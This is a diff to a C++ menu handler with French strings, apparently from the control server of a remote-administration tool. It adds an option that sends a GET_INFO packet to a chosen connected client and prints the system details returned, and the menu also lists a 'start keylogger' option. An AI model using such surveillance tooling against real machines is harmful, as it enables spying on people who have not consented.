@@ -56,9 +56,31 @@ void Menu::handleChoice(int choice) {
         case 2:
             std::cout << "Option 2 sélectionnée: Envoyer un message au client" << std::endl;
             break;
-        case 3:
-            std::cout << "Option 3 sélectionnée: Afficher les informations du client" << std::endl;
+        case 3: {
+            std::cout << "Récupération des informations système du client:" << std::endl;
+            for (size_t i = 0; i < clients.size(); ++i) {
+                std::cout << i << " - " << clients[i]->getClientIP() << std::endl;
+            }
+            std::cout << "Choisissez le client: ";
+            int idx;
+            std::cin >> idx;
+            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            if (idx < 0 || idx >= static_cast<int>(clients.size())) {
+                std::cout << "Index de client invalide." << std::endl;
+                break;
+            }
+            // Send GET_INFO request to client
+            LPTF_Packet request(1, PacketType::GET_INFO, 0, 1, 1, {});
+            clients[idx]->sendBinary(request.serialize());
+            // Receive response from client
+            auto data = clients[idx]->recvBinary();
+            auto packet = LPTF_Packet::deserialize(data);
+            std::string payload(packet.getPayload().begin(), packet.getPayload().end());
+            std::cout << "=== Informations système du client ===" << std::endl;
+            std::cout << payload << std::endl;
+            std::cout << "=======================================" << std::endl;
             break;
+        }
         case 4:
             std::cout << "Option 4 sélectionnée: Démarrer le keylogger" << std::endl;
             break;
